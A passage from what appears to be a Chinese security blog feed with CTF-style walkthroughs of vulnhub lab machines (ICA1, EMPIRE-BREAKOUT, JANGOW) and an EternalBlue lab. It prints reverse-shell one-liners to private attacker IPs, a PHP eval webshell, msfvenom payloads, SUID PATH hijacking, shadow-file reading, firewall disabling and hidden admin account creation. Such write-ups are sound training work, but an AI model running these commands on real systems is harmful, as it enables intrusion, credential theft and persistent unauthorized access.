        <content type="html"><![CDATA[<h1>『vulnhub系列』ICA1</h1><h2 id="下载地址">下载地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://download.vulnhub.com/ica/ica1.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><h2 id="信息搜集">信息搜集</h2><p>如果靶机获取不了IP地址请看这里：<a href="https://jo4hua.github.io/2024/05/09/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FJANGOW/">『vulnhub系列』JANGOW | Don_Joshua’s Blog (jo4hua.github.io)</a></p><p>使用命令<code>nmap 192.168.0.130</code> 找到存活主机</p><p><img src="Untitled.png" alt="Untitled"></p><p>开启了ssh,http,mysql服务，先访问80端口，进入如下登录界面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch扫描目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.136/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>发现数据库配置界面</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>使用<code>searchsploit qdPM 9.2</code> 发现如下漏洞</p><p><img src="Untitled%204.png" alt="Untitled"></p><p>一个是csrf现在我们还没到那一步，第二个是密码泄露，我们使用</p><p><code>searchsploit -m 50176.txt</code> 将50176移到当前目录下，使用<code>cat 50176.txt</code>查看</p><p><img src="Untitled%205.png" alt="Untitled"></p><h2 id="漏洞利用">漏洞利用</h2><p>发现访问<code>http://&lt;website&gt;/core/config/databases.yml</code> 网站的这个链接，即可以看到数据库的用户名和密码 ，成功（<code>qdpmadmin:UcVQCMQk2STVeS6J</code>）</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>尝试登录一下</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>成功，记住这个邮箱，并设置密码（<code>admin@localhost.com:admin</code>）</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>成功</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>回到主页面，使用刚刚的邮箱登录</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>发现登录失败，但是通过修改密码我们可以发现，邮箱是对的。</p><p>我们使用mysql登录，成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -h <span class="number">192.168</span><span class="number">.0</span><span class="number">.136</span> -u qdpmadmin -p</span><br><span class="line">---然后输入密码</span><br></pre></td></tr></table></figure><p><img src="Untitled%2011.png" alt="Untitled"></p><p>通过上面的配置文件，我们可以知道数据库的名字是<code>qdpm</code> ，<code>use qdpm</code> ，<code>show tables</code> 查看这个数据库里的表，我们发现<code>users</code>表</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p><code>show columns from users</code> 查看字段名</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p>果然是password，现在我们查询一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password <span class="keyword">from</span> users where email=<span class="string">&quot;admin@localhost.com&quot;</span></span><br></pre></td></tr></table></figure><p>结果高兴的有些早了，我们发现查询数据为空…….，应该直接看有没有数据的</p><p><img src="Untitled%2014.png" alt="Untitled"></p><p>直接一个一个查看每一个表，最后在<code>configuration</code>中找到我们需要的东西</p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>但是<code>$P$E0dY11qb93cBPO/VuVULOQPHeuLb6m/</code> 是一段hash值，很像是crypt中的，但判断不出来。</p><p>在安装工具<code>hash-identifier</code> 之后，我们使用<code>hash-identifier</code> 进行判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/blackploit/<span class="built_in">hash</span>-identifier.git</span><br><span class="line">cd /<span class="built_in">hash</span>-identifier</span><br><span class="line">python <span class="built_in">hash</span>-<span class="built_in">id</span>.py</span><br></pre></td></tr></table></figure><p>输入对应的hash值之后，我们可以得到类型可能是md5</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>我们使用本机生成一个md5的hash然后覆盖掉原来的hash，这里使用python生成一个密码为<code>admin</code>的hash值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line">crypt.crypt(<span class="string">&#x27;admin&#x27;</span>, crypt.mksalt(crypt.METHOD_MD5))</span><br><span class="line">------结果</span><br><span class="line">$<span class="number">1</span>$aFzipe0r$qYbks7esarcBVgfO0.oay1</span><br></pre></td></tr></table></figure><p>修改app_administrator_password（id=2）的value，成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update configuration <span class="built_in">set</span> value=<span class="string">&#x27;$1$aFzipe0r$qYbks7esarcBVgfO0.oay1&#x27;</span> where <span class="built_in">id</span>=<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><p>登录试试，成功</p><p><img src="Untitled%2018.png" alt="Untitled"></p><p>此时，我们添加用户</p><p><img src="Untitled%2019.png" alt="Untitled"></p><p>发现可以上传文件</p><p><img src="Untitled%2020.png" alt="Untitled"></p><p>上传看一下，报错</p><p><a href="https://www.notion.so">https://www.notion.so</a></p><p>但是我们一开始是有一个<code>/uploads</code>文件夹,发现文件已经上传成功了</p><p><img src="Untitled%2021.png" alt="Untitled"></p><p>此时我们上传一个php一句话木马试试</p><p><img src="Untitled%2022.png" alt="Untitled"></p><p>发现并没有这个文件</p><p><img src="Untitled%2023.png" alt="Untitled"></p><p>我们用burp试试，提交的时候抓包，将Content-Type:后面的类型改为<code>image/jpeg</code> 顺手在文件内容前面加上<code>GIF89A</code> （保险）</p><p><img src="Untitled%2024.png" alt="Untitled"></p><p>提交，失败</p><p><img src="Untitled%2025.png" alt="Untitled"></p><p>我们切换到新建的用户中，发现有一个上传文件的地方</p><p><img src="Untitled%2026.png" alt="Untitled"></p><p>上传一个php文件试试</p><p><img src="Untitled%2027.png" alt="Untitled"></p><p>此时在<code>/uploads/attachments/</code>页面发现php文件了</p><p><img src="Untitled%2028.png" alt="Untitled"></p><p>之后用同样的方式，上传msf生成的php</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span> lport=<span class="number">4444</span> -o re_shell.php</span><br></pre></td></tr></table></figure><p>上传之后使用<code>msfconsole</code>进入msf，使用相同的payload监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2029.png" alt="Untitled"></p><p>监听，<code>run</code></p><p>访问刚刚上传的webshell文件，成功</p><p><img src="Untitled%2030.png" alt="Untitled"></p><h2 id="提升权限">提升权限</h2><p>使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p>查看可以具有SUID权限的文件，我们发现有一个<code>/opt/get_access</code> 很可疑</p><p><img src="Untitled%2031.png" alt="Untitled"></p><p>运行一下</p><p><img src="Untitled%2032.png" alt="Untitled"></p><p>使用命令strings 命令查看一下,文件中的可打印字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /opt/get_access</span><br></pre></td></tr></table></figure><p><img src="Untitled%2033.png" alt="Untitled"></p><p>然后我们在其中可以发现，这个程序运行的时候，可以以root权限执行<code>cat</code>命令，因此这里的思路是</p><ul><li>将环境变量中的cat修改为我们的自己建立的<code>cat</code></li></ul><p>这样当运行这个文件的时候，就可以运行我们的<code>cat</code>了</p><h3 id="创建新的cat">创建新的cat</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;/bin/bash&quot;</span> &gt; /tmp/cat</span><br></pre></td></tr></table></figure><p>将<code>/bin/bash</code>写入<code>/tmp/cat</code>文件中，这样以<code>root</code>权限运行时，就会将<code>root</code>的/<code>bin/bash</code>反弹回来</p><p>并赋予其可执行权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/cat</span><br></pre></td></tr></table></figure><h3 id="增加环境变量">增加环境变量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><p>可以将/tmp/cat的路径加入到PATH，从而可以在任何地方直接使用hello命令。并且对所有用户生效</p><h3 id="运行get-access">运行get_access</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/get_access</span><br></pre></td></tr></table></figure><p>见证奇迹的时刻，<code>whoami</code></p><p><img src="Untitled%2034.png" alt="Untitled"></p><h2 id="成果">成果</h2><h3 id="root">/root</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ICA&#123;Next_Generation_Self_Renewable_Genetics&#125;</span><br></pre></td></tr></table></figure><h3 id="home-travis">/home/travis</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ICA&#123;Secret_Project&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』EMPIRE-BREAKOUT</title>
      <link href="/2024/05/17/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FEMPIRE-BREAKOUT/"/>
      <url>/2024/05/17/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FEMPIRE-BREAKOUT/</url>
      
        <content type="html"><![CDATA[<h1>『vulnhub系列』EMPIRE-BREAKOUT</h1><h2 id="下载地址">下载地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/empire-breakout,<span class="number">751</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集">信息搜集</h2><p>使用nmap扫描内网存活主机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口发现apache默认页面</p><p>在网页源代码中找到提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">don<span class="string">&#x27;t worry no one will get here, it&#x27;</span>s safe to share <span class="keyword">with</span> you my access. Its encrypted :)</span><br><span class="line"></span><br><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>根据多年<strong>前</strong>的ctf经验，发现这是<strong>Brainfuck/OoK加密解密</strong><a href="https://ctf.bugku.com/tool/brainfuck">Brainfuck/OoK加密解密 - Bugku CTF</a>，在相应网站进行解密得到一串字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文：++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br><span class="line">明文：<span class="number">.2</span>uqPEfj3D&lt;P<span class="string">&#x27;a-3</span></span><br></pre></td></tr></table></figure><p>使用工具enum4linux枚举用户</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -r <span class="number">192.168</span><span class="number">.0</span><span class="number">.134</span></span><br></pre></td></tr></table></figure><p>发现存在用户cyber</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>访问10000端口，发现登陆页面</p><p><img src="Untitled%202.png" alt="Untitled"></p><p>访问20000端口，发现登录页面</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>使用<code>cyber:.2uqPEfj3D&lt;P'a-3</code> 登录20000端口，进入页面</p><p><img src="Untitled%204.png" alt="Untitled"></p><p>进入到Usermin页面，发现命令行</p><p><img src="Untitled%205.png" alt="Untitled"></p><p><code>ls</code> 查看当前目录</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>使用命令<code>cat user.txt</code> 得到普通flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br></pre></td></tr></table></figure><h2 id="反弹shell">反弹shell</h2><p>首先在攻击机监听4444端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">4444</span></span><br></pre></td></tr></table></figure><p>此时我们在网页端的命令行界面反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><p><img src="Untitled%207.png" alt="Untitled"></p><h2 id="提升权限">提升权限</h2><p>使用<code>ls -l</code>发现，存在一个tar文件，并且具有root权限</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>使用命令<code>getcap tar</code> 查看，发现文件存在CAP_DAC_READ_SEARCH权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CAP_DAC_READ_SEARCH:忽略文件读及目录搜索的DAC访问限制</span><br></pre></td></tr></table></figure><p>因此我们可以使用tar跨越目录来解压缩文件</p><p>试验，我们甚至可以将shadow，复制过来，然后读取</p><p>使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvf shadow.rar /etc/shadow <span class="comment">#使用当前目录的tar压缩/etc/shadow文件</span></span><br><span class="line">./tar -xvf shadow.rar</span><br><span class="line">cd etc</span><br><span class="line">cat shadow</span><br></pre></td></tr></table></figure><p>一开始是想使用john对shadow进行暴力破解的，但多少有些不现实</p><p>于是就使用<code>ls -la</code>对目录进行地毯式搜索</p><p>于是在<code>/var/backups</code>中找到一个隐藏文件<code>.old_pass.bak</code></p><p><img src="Untitled%209.png" alt="Untitled"></p><p>并且使用cat命令，无法访问</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>所以这个文件很可疑啊，使用<code>tar</code>拿出来看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvf backup.tar /var/backups/.old_pass.bak</span><br><span class="line">./tar -xvf backup.tar</span><br><span class="line">cd var/backups</span><br><span class="line">cat .old_pass.bak</span><br></pre></td></tr></table></figure><p>发现有一串跟之前的密码很像的字符串</p><p><img src="Untitled%2011.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ts&amp;<span class="number">4</span>&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure><p>此时我们切换root用户试一试，成功</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>使用pyhton开启交互式shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyhton3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2013.png" alt="Untitled"></p><p><code>cd</code> 之后<code>cat rOOt.txt</code> 获得最后的flag</p><p><img src="Untitled%2014.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;</span><br></pre></td></tr></table></figure><p>顺便给大家看看，这边还暴力破解着呢</p><p><img src="Untitled%2015.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』JANGOW</title>
      <link href="/2024/05/09/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FJANGOW/"/>
      <url>/2024/05/09/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FJANGOW/</url>
      
        <content type="html"><![CDATA[<h1>『vulnhub系列』JANGOW: 1.0.1</h1><h2 id="下载地址">下载地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/jangow-101,754/</span><br></pre></td></tr></table></figure><h2 id="遇到问题">遇到问题</h2><p>发现不能获取ip地址</p><p>我们来到初始页面按e，将linux后面的<code>ro</code>改为<code>rw single init=/bin/bash</code></p><p>然后Ctrl+x重启进入如下界面</p><p><img src="Untitled.png" alt="Untitled"></p><p><code>ip a</code> 查看网卡，发现是ens33</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>修改配置文件<code>nano /etc/network/interfaces</code></p><p><img src="Untitled%202.png" alt="Untitled"></p><p>将下列两个enp0s17修改为ens33</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>重启，使用nmap扫描，成功获取IP地址</p><p><img src="Untitled%204.png" alt="Untitled"></p><h2 id="信息搜集">信息搜集</h2><p>由刚才的扫描结果可知，这个机器开启了80端口，访问一下</p><p><img src="Untitled%205.png" alt="Untitled"></p><p>使用dirsearch扫描目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.133/&quot;</span></span><br></pre></td></tr></table></figure><p>发现了刚刚访问的site目录和<code>.backup</code>文件</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>访问一下<code>.backup</code> 发现数据库信息（数据库名，用户名，密码）</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>乱点发现代码执行</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>使用命令执行，写入一句话木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&#x27;</span> &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><p>使用ls查看，成功</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>使用蚁剑连接</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>在wordpass目录发现新的配置文件</p><p><img src="Untitled%2011.png" alt="Untitled"></p><p>使用ftp登录，用两个用户登录，注意！！！：密码是abygurl69，这里是l是字母，不是数字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.133</span><br></pre></td></tr></table></figure><p>我们可以发现/etc/passwd中有jangow01用户</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>使用jangow01登陆成功</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p><code>ls -al</code>但是发现啥都没有</p><p><img src="Untitled%2014.png" alt="Untitled"></p><h2 id="漏洞利用">漏洞利用</h2><p>使用命令执行漏洞或者使用蚁剑在site目录下写入反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    system(<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.130 443 &gt;/tmp/f&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2015.png" alt="Untitled"></p><p>在攻击机进行监听，好像只能在443端口完成反弹……</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>使用python获取交互式shell，并尝试切换jangow01用户，成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">su jangow01</span><br><span class="line">abygurl69</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><h2 id="提升权限">提升权限</h2><p>使用命令<code>uname -a</code> 查看系统内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux jangow01 4.4.0-31-generic <span class="comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>然后查找相应的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 4.4.0-31</span><br></pre></td></tr></table></figure><p><img src="Untitled%2018.png" alt="Untitled"></p><p>下载47170.c,注意：先不要在攻击机上编译，可能会出现问题，直接把.c文件上传到靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 47170.c</span><br></pre></td></tr></table></figure><p>可以使用python搭建服务器将exp传到靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p><img src="Untitled%2019.png" alt="Untitled"></p><p>在靶机使用wget下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.130:8000/exp</span><br></pre></td></tr></table></figure><p>使用ftp传输，登录ftp成功后先进入jingow01的目录，然后上传exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/jangow01</span><br><span class="line">put 45010.c</span><br></pre></td></tr></table></figure><p>进入jungow01目录查看，已经存在，并进行编译生成exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o exp</span><br></pre></td></tr></table></figure><p><img src="Untitled%2020.png" alt="Untitled"></p><p>执行exp，<code>./exp</code> ,成功</p><p><img src="Untitled%2021.png" alt="Untitled"></p><p>进入root目录查看，渗透完成</p><p><img src="Untitled%2022.png" alt="Untitled"></p><p>查看进入root目录查看</p><p><img src="Untitled%2023.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝实验</title>
      <link href="/2024/05/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C/"/>
      <url>/2024/05/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1>永恒之蓝实验</h1><p>我们通过永恒之蓝漏洞的利用来复现一下到提权和权限维持的windows渗透思路</p><h2 id="信息搜集">信息搜集</h2><p>首先扫描局域网内存活主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>之后使用nmap扫描132主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.132</span><br></pre></td></tr></table></figure><p><img src="Untitled%201.png" alt="Untitled"></p><p>发现目标开启了445端口，可以利用永恒之蓝，进入msfconsole</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><h2 id="漏洞利用">漏洞利用</h2><p>扫描msf17-010</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p><img src="Untitled%203.png" alt="Untitled"></p><p>我们使用第一个，然后查看配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="Untitled%204.png" alt="Untitled"></p><p>设置目标IP和payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.0.132</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><h2 id="提权">提权</h2><p>成功，进入shell并修改编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid <span class="comment">#获取system权限</span></span><br><span class="line">shell</span><br><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>关闭防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**netsh advfirewall <span class="built_in">set</span> currentprofile state off</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> privateprofile state off**</span><br></pre></td></tr></table></figure><p><img src="Untitled%206.png" alt="Untitled"></p><p>开启3389</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p><img src="Untitled%207.png" alt="Untitled"></p><p>查看端口 <code>netstat -an</code> ，开启成功</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>创建用户，并给用户赋予管理员权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin$ Test123 /add</span><br><span class="line">net localgroup Administrators admin$ /add</span><br></pre></td></tr></table></figure><p>远程桌面连接，成功</p><p><img src="Untitled%209.png" alt="Untitled"></p><h2 id="权限维持">权限维持</h2><p>可以结合之前的影子账户，完成后续的操作</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP饿死攻击及防御(基于ENSP模拟器、Kali攻击机实现)</title>
      <link href="/2024/04/25/DHCP%E9%A5%BF%E6%AD%BB%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1(%E5%9F%BA%E4%BA%8EENSP%E6%A8%A1%E6%8B%9F%E5%99%A8%E3%80%81Kali%E6%94%BB%E5%87%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0)/"/>
      <url>/2024/04/25/DHCP%E9%A5%BF%E6%AD%BB%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1(%E5%9F%BA%E4%BA%8EENSP%E6%A8%A1%E6%8B%9F%E5%99%A8%E3%80%81Kali%E6%94%BB%E5%87%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0)/</url>
      
